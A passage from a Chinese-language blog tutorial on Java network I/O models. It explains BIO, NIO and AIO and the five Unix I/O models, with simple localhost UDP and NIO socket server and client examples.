class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UDP 服务端 - 同步阻塞模式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BIOUDPServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ArrayList&lt;String&gt; DICT = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(</span><br><span class="line">            Arrays.asList(<span class="string">&quot;Zero&quot;</span>, <span class="string">&quot;One&quot;</span>, <span class="string">&quot;Two&quot;</span>, <span class="string">&quot;Three&quot;</span>, <span class="string">&quot;Four&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Five&quot;</span>, <span class="string">&quot;Six&quot;</span>, <span class="string">&quot;Seven&quot;</span>, <span class="string">&quot;Eight&quot;</span>, <span class="string">&quot;Nine&quot;</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">DatagramSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(<span class="number">6667</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">DatagramPacket</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">                <span class="comment">// 接收数据包</span></span><br><span class="line">                server.receive(request);</span><br><span class="line">                <span class="comment">// 收到请求</span></span><br><span class="line">                System.out.println(<span class="string">&quot;# 客户端数据报：&quot;</span> + request.getAddress() + <span class="string">&quot;:&quot;</span> + request.getPort() + <span class="string">&quot;#&quot;</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> Integer.parseInt(<span class="keyword">new</span> <span class="title class_">String</span>(request.getData()));</span><br><span class="line">                <span class="type">byte</span>[] data = DICT.get(index).getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                <span class="type">SocketAddress</span> <span class="variable">clientAddress</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(request.getAddress(), request.getPort());</span><br><span class="line">                <span class="type">DatagramPacket</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, data.length, clientAddress);</span><br><span class="line">                server.send(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端代码-1">客户端代码</h4><p><strong>注意</strong>，在UDP下创建客户端的Socket时，和TCP是有区别的，TCP中我们使用：<code>new Socket("127.0.0.1", 6666);</code>，这个端口指的是远程的端口。而在UDP客户端socket初始化时，<code>new DatagramSocket(0)</code>，这里填写的<strong>可不是远程的，而是本地的</strong>，0代表随机选择一个。客户端代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UDP 客户端 - 同步阻塞模式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BIOUDPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 设置绑定的本地端口，0代表随机选择</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">DatagramSocket</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// 设置超时（单位：毫秒）</span></span><br><span class="line">            client.setSoTimeout(<span class="number">10000</span>);</span><br><span class="line">            <span class="comment">// 创建数据报</span></span><br><span class="line">            <span class="type">SocketAddress</span> <span class="variable">remote</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6667</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">wordToInquire</span> <span class="operator">=</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] dataToSend = wordToInquire.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">requestPacket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(dataToSend, dataToSend.length, remote);</span><br><span class="line">            <span class="comment">// 构造接收的报文</span></span><br><span class="line">            <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span>];</span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">recvedPacket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, data.length);</span><br><span class="line">            client.send(requestPacket);</span><br><span class="line">            client.receive(recvedPacket);</span><br><span class="line">            System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(recvedPacket.getData()).trim());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行结果-1">运行结果</h4><figure><img src="/img/Java网络编程模型Review/image-20230104005528740.png"alt="BIO UDP运行结果" /><figcaption aria-hidden="true">BIO UDP运行结果</figcaption></figure><p>在这个过程中我重启了两次客户端程序，可以看到：</p><ul><li>每次的本地客户端端口都是随机选取的（左边服务器端显示的日志）。</li><li>客户端程序结束了，但服务端会一直<strong>阻塞</strong>在<code>receive()</code>等待新的数据包。</li></ul><h1 id="java中三种io模型及其实现">Java中三种I/O模型及其实现</h1><p>知道基本的Socket、TCP/UDP相关java的API使用方式后，我们就要深究一下，有哪些IO模式了，通常上，我们使用两个指标来划分，即：<strong>同步</strong>or<strong>异步</strong>，<strong>阻塞</strong>or<strong>非阻塞</strong>。那同步异步区别在哪呢？它们的区别在<strong>消息通信机制</strong>上，同步为<code>Synchronous Communication</code>，而异步为<code>Aynchronous Communication</code>，具体来说：</p><ul><li>同步模式下，我们调用一个方法，在这个方法完成前，我们需要一直<strong>主动</strong>等待它（这个主动的理解很关键），没得到结果前我们会一直等着。</li><li>异步模式下，同样一个方法，我们调用后将直接返回，在它完成前，我们不需要等待他，而是由它<strong>主动</strong>通知我们，<strong>结果</strong>好了，可以使用了。通知方法如信号、回调函数等。</li></ul><p>ok，那同步异步的区别实际上就是看是我们<strong>主动</strong>等结果，还是结果<strong>主动</strong>通知我们了。那阻塞和非阻塞呢？</p><ul><li>阻塞IO下，执行阻塞的系统调用（如前面我们看到的<code>receive</code>）当前线程会被挂起，等待<strong>系统调用的完成</strong>。</li><li>非阻塞IO下，与阻塞相反，非阻塞的系统调用会直接返回一个<strong>瞬时</strong>的结果，无需等待系统调用的完成。然后通过<strong>轮询</strong>的方式去判断调用是否完成。典型的例子如<code>select</code>系统调用，它可以<strong>轮询</strong>检测活动的socket而无需等待，有I/O可用时将直接返回。</li></ul><p>所以根据同步异步的<strong>消息通信机制</strong>，以及阻塞非阻塞的IO方式，我们可以排列组合得到如下集中IO模型：</p><ul><li>同步阻塞</li><li>同步非阻塞</li><li><del>异步阻塞</del></li><li>异步非阻塞（其实没这个说法，直接就叫异步）</li></ul><p>哎为什么没有异步阻塞呢？因为前面我们说异步模式下，方法会直接返回无需等待，所以<strong>异步一定是非阻塞的</strong>。但是反过来可就不对了（如select同步非阻塞）。</p><p>所以从大的方面上来说，我们有三种IO模型。实际上，Unix中有5种IO模型，划分更为细致。分别为：</p><ul><li>BlockingIO（同步阻塞），可以看到流程其实和我们UDP程序逻辑是一样的，也即Java原始的<strong>BIO</strong></li></ul><figure><img src="/img/Java网络编程模型Review/阻塞模式.jpg" alt="阻塞模式" /><figcaption aria-hidden="true">阻塞模式</figcaption></figure><ul><li>NonBlocking IO （同步非阻塞，轮询）</li></ul><figure><img src="/img/Java网络编程模型Review/非阻塞模式.jpg"alt="非阻塞模式" /><figcaption aria-hidden="true">非阻塞模式</figcaption></figure><ul><li>IO Multiplexing（如select、poll）（同步阻塞，但相较于BlockingIO，能监听更多的socket）。这也是<strong>Java的NIO原理</strong>，这个有大量的应用，比如你Nginx。</li></ul><figure><img src="/img/Java网络编程模型Review/IO多路复用.jpg"alt="IO多路复用" /><figcaption aria-hidden="true">IO多路复用</figcaption></figure><ul><li>Signal-Driven（同步非阻塞，当IO操作<strong>准备好时</strong>会通过信号通知）</li></ul><figure><img src="/img/Java网络编程模型Review/信号驱动.jpg" alt="信号驱动" /><figcaption aria-hidden="true">信号驱动</figcaption></figure><ul><li>AsynchronousIO（异步，当IO操作<strong>完成时</strong>会通过信号通知）。这也是<strong>Java的AIO原理</strong>。</li></ul><figure><img src="/img/Java网络编程模型Review/异步.jpg" alt="异步" /><figcaption aria-hidden="true">异步</figcaption></figure><p>注意，前四种都是同步的，这是因为他们都需要调用<code>receive</code>等方法将<strong>数据从内核空间复制到用户空间</strong>，都会导致当前线程挂起。而只有异步的IO模型，是真正不需要这个操作的（上图中没有出现如<code>recvform</code>的系统阻塞调用）。这五种模型的比较如下图所示：</p><figure><img src="/img/Java网络编程模型Review/5种IO模型比较.jpg"alt="UNIX中5种IO模型比较" /><figcaption aria-hidden="true">UNIX中5种IO模型比较</figcaption></figure><h2 id="bio">BIO</h2><p>BIO（BlockingIO），即IO是阻塞的状态，其实上一章节中我们的BIOServer就是阻塞的，即服务器会<strong>阻塞在accept/receive，等待客户端的连接</strong>，这个时候你的程序是干不了其他事情的。<strong>BIO是一种同步阻塞的机制。</strong>具体详情前面的代码、示图已经说的很清楚了。Java中主要使用的就是<code>java.net.*</code>下面的类。</p><h2 id="nio">NIO</h2><p>JDK 1.4中java引入了NIO（NewIO），主要是使用了<code>Selector</code>实现了IO多路复用。其实在Linux中，该机制是通过<code>select</code>系统调用来实现的。</p><p>我写过一个简单的C语言的聊天室<ahref="https://github.com/lzwgiter/MyCWebStudy">项目</a>，感兴趣的可以看看，该项目就是用的<code>select</code>机制来实现的。当然也有更好的<code>epoll</code>可以替换。<strong>NIO本质上是一种利用了I/O多路复用技术的、同步非阻塞的机制。但是相较于BIO，可以处理更多的Socket。</strong></p><h3 id="使用方法">使用方法</h3><p>我们以TCP为例。Java中主要使用<code>java.nio.*</code>下的类来实现，常用的类如：<code>java.nio.channels.Selector</code>、<code>java.nio..channels.ServerSocketChannel</code>、<code>java.nio.channels.SocketChannel</code>。至于UDP，将上面的<code>ServerSocketChannel</code>和改为使用<code>DatagramChannel</code>即可，他们的关系如下：</p><figure><img src="/img/Java网络编程模型Review/NIO常用类关系图.png"alt="NIO常用类关系图" /><figcaption aria-hidden="true">NIO常用类关系图</figcaption></figure><p>用一张图表示的话，NIO的结构是这样的：</p><figure><img src="/img/Java网络编程模型Review/image-20230107200241928.png"alt="NIO结构" /><figcaption aria-hidden="true">NIO结构</figcaption></figure><p>下面我们就使用上述类写一个服务端和客户端，学习一下使用方法。</p><h4 id="服务端">服务端</h4><p>对于服务端，我们主要使用<code>java.nio.Selector</code>来监听多个socket，<strong>此时我们不需要手动for循环去判断哪一个socket可用，而是由操作系统通知JVM哪个socket可用读入或写入</strong>。</p><p>注意，在<code>select</code>时，Java会调用<code>java.nio.channels.spi.SelectorProvider</code>这个单例类的<code>provide()</code>方法来返回操作系统的具体实现。且当<code>select</code>时，当前线程会阻塞，等待有IO可用时、操作系统的通知。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SelectionKey;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.Selector;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.ServerSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Java NIO</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2022/12/30</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();</span><br><span class="line">             <span class="type">ServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> ServerSocketChannel.open()) &#123;</span><br><span class="line">            <span class="comment">// 设置为非阻塞模式</span></span><br><span class="line">            serverSocketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">            <span class="comment">// 绑定端口</span></span><br><span class="line">            serverSocketChannel.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">6666</span>));</span><br><span class="line">            <span class="comment">// 将serverSocketChannel的accept交由selector来处理</span></span><br><span class="line">            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line">            System.out.println(<span class="string">&quot;端口注册完成, 等待连接中......&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 阻塞在select方法</span></span><br><span class="line">            <span class="keyword">while</span> (selector.select() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 我们使用SelectionKey来对可用的socket进行遍历</span></span><br><span class="line">                Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">                <span class="comment">// 处理每一个事件</span></span><br><span class="line">                SocketChannel sc;</span><br><span class="line">                Iterator&lt;SelectionKey&gt; iter = selectionKeys.iterator();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 遍历每一个可用的socket</span></span><br><span class="line">                <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">                    <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> iter.next();</span><br><span class="line">                    <span class="keyword">if</span> (key.isAcceptable()) &#123;</span><br><span class="line">                        <span class="type">ServerSocketChannel</span> <span class="variable">nssc</span> <span class="operator">=</span> (ServerSocketChannel) key.channel();</span><br><span class="line">                        sc = nssc.accept();</span><br><span class="line">                        <span class="comment">// 设为非阻塞</span></span><br><span class="line">                        sc.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                        <span class="comment">// 注册并分配缓存区</span></span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">echoBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">100</span>);</span><br><span class="line">                        sc.register(selector, SelectionKey.OP_READ, echoBuffer);</span><br><span class="line">                        System.out.println(LocalDateTime.now() + <span class="string">&quot; - ** 新的连接 ** &quot;</span> + sc);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isReadable()) &#123;</span><br><span class="line">                        sc = (SocketChannel) key.channel();</span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">echoBuffer</span> <span class="operator">=</span> (ByteBuffer) key.attachment();</span><br><span class="line">                        <span class="comment">// 读取数据</span></span><br><span class="line">                        echoBuffer.clear();</span><br><span class="line">                        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> sc.read(echoBuffer);</span><br><span class="line">                        <span class="keyword">if</span> (len == -<span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            echoBuffer.clear();</span><br><span class="line">                            <span class="type">String</span> <span class="variable">raw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(echoBuffer.array()).trim();</span><br><span class="line">                            System.out.println(LocalDateTime.now() + <span class="string">&quot; - ## 接收来自 &quot;</span> + sc + <span class="string">&quot;的数据：&quot;</span> + raw + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                            <span class="comment">// 处理消息</span></span><br><span class="line">                            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;MSG: &#123;&quot;</span> + raw + <span class="string">&quot;&#125; is accepted.&quot;</span>;</span><br><span class="line">                            echoBuffer.put(response.getBytes());</span><br><span class="line">                            echoBuffer.flip();</span><br><span class="line">                            sc.write(echoBuffer);</span><br><span class="line">                            System.out.println(LocalDateTime.now() + <span class="string">&quot; - ## 发送给 &quot;</span> + sc + <span class="string">&quot;的数据：&quot;</span> +</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">String</span>(echoBuffer.array()).trim() + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 关闭客户端连接</span></span><br><span class="line">                        sc.close();</span><br><span class="line">                        System.out.println(sc + <span class="string">&quot;连接结束&quot;</span>);</span><br><span class="line">                        System.out.println(<span class="string">&quot;===========================&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 从遍历集合中删除</span></span><br><span class="line">                    iter.remove();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;this is a simple test.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>这里需要澄清一个小概念，我学习时就有疑惑</strong>。单线程下，若没有可用的I/O操作，那不就阻塞在<code>select</code>函数吗？啥都干不了啊？</p><p>实际上阻塞、非阻塞都是对于I/O操作来说的，由于I/O多路复用机制提供了单线程下操作多个I/O的方法，因此我们当前线程不会阻塞在单个I/O中。比如现在有两个个客户端连接进来了，ok我们处理了1号I/O，由于1没有新的消息了，因此我们会去处理2号I/O，<strong>而并没有阻塞在1号I/O上。</strong>因此说它是非阻塞的。</p><h4 id="客户端">客户端</h4><p>客户端代码要简单一些。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Java NIO客户端</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2022/12/30</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> SocketChannel.open(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">6666</span>))) &#123;</span><br><span class="line">            client.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;this is a simple test.&quot;</span>;</span><br><span class="line">            System.out.println(LocalDateTime.now() + <span class="string">&quot; - ##发送数据: &quot;</span> + msg + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">100</span>);</span><br><span class="line">            buffer.put(msg.getBytes());</span><br><span class="line">            buffer.flip();</span><br><span class="line">            client.write(buffer);</span><br><span class="line">            buffer.clear();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> client.read(buffer);</span><br><span class="line">                <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(LocalDateTime.now() + <span class="string">&quot; - ##接收数据: &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(buffer.array()).trim() + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                    client.close();</span><br><span class="line">                    System.out.println(LocalDateTime.now() + <span class="string">&quot; - ##连接关闭: &quot;</span> + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果-2">运行结果</h3><figure><img src="/img/Java网络编程模型Review/image-20230107011032615.png"alt="NIO运行结果" /><figcaption aria-hidden="true">NIO运行结果</figcaption></figure><h2 id="aio">AIO</h2><p>JDK 1.7引入了NIO2.0，也即AIO（AsynchronousIO），他为我们提供了异步的可能性，如异步的文件通道、异步的套接字通道，他的底层在Windows中是通过<code>IOCP（I/O Completion Port）</code>来实现的，Linux中则是<code>epoll</code>。<strong>AIO本质上是一种异步的机制。</strong></p><p>那么AIO和BIO的区别在哪里呢？其实很好理解，在上一节NIO代码可以看出，<strong>操作系统通知我们的时刻，是该IO就绪的时刻，即可读或可写</strong>，在此之前我们是阻塞的。回顾一下select的图：</p><figure><img src="/img/Java网络编程模型Review/IO多路复用.jpg"alt="IO多路复用" /><figcaption aria-hidden="true">IO多路复用</figcaption></figure><p>而对于真正的异步，我们是不需要主动等待的，而是立即返回，并由操作系统通知我们。<strong>对于AIO，操作系统通知我们的时刻，是该IO已经完成的时刻，即读完了，写完了</strong>。回顾一下异步的图。</p><figure><img src="/img/Java网络编程模型Review/异步.jpg" alt="异步" /><figcaption aria-hidden="true">异步</figcaption></figure><h3 id="使用方法-1">使用方法</h3><p>我们以TCP为例。Java中主要使用<code>java.nio.*</code>下的类来实现，常用的类如：<code>java.nio.channels.AsynchronousSocketChannel</code>、<code>java.nio.channels.AsynchronousServerSocketChannel</code>、<code>java.nio.channels.CompletionHandler</code>。至于UDP，将上面的<code>AsynchronousSocketChannel</code>和改为使用<code>AsynchronousDatagramChanel</code>即可，他们的关系如下：</p><figure><img src="/img/Java网络编程模型Review/AIO常用类关系图.png"alt="AIO常用类关系图" /><figcaption aria-hidden="true">AIO常用类关系图</figcaption></figure><p>注意到，在<code>AsynchronoutSocketChannel</code>中，<code>accept</code>、<code>connect</code>、<code>read</code>和<code>write</code>方法有都提供了使用<code>CompletionHandler&lt;Integer, A&gt;</code>的<strong>回调机制</strong>，这也是体现异步的地方，这四个函数的调用会立即返回，不会阻塞，且将这四个函数的<strong>具体执行交给JVM默认线程池的某个线程在后台执行，当操作完成后，该线程会再执行传入的回调函数来通知我们</strong>。</p><p>这样的回调机制和方法声明，在NIO中是没有的，也是最主要的一个区别。我们可以看一下这个关键的<code>java.nio.channels.CompletionHandler</code>是怎么定义的：</p><figure><img src="/img/Java网络编程模型Review/image-20230106144042454.png"alt="CompletionHandler接口定义" /><figcaption 